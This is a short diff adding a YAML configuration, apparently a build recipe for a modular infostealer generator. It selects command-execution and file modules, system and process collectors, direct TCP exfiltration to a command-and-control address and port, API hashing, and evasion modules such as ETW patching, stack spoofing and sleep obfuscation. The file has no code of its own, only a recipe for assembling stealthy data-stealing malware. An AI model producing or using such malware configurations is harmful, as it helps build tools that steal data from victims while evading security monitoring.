@@ -1,0 +1,23 @@
+name: infostealer_cs_stealth_v4_indirect
+description: Auto-generated recipe by Hermes (c)
+core:
+- core/emit_buffer
+- core/run_cmd
+- core/file_ops
+collectors:
+- collectors/system_info
+- collectors/processes
+exfil: exfil/tcp_direct
+arch: arch/sequential
+resources: true
+api_resolve: api_resolve/api_hash_crc32
+evasion:
+- evasion/stack_spoof
+- evasion/sleep_ekko
+- evasion/etw_patch
+- evasion/sleep_jitter
+- evasion/behavioral_pacing
+- evasion/thread_stack_spoof
+vars:
+  C2_IP: 10.0.2.2
+  C2_PORT: '9001'
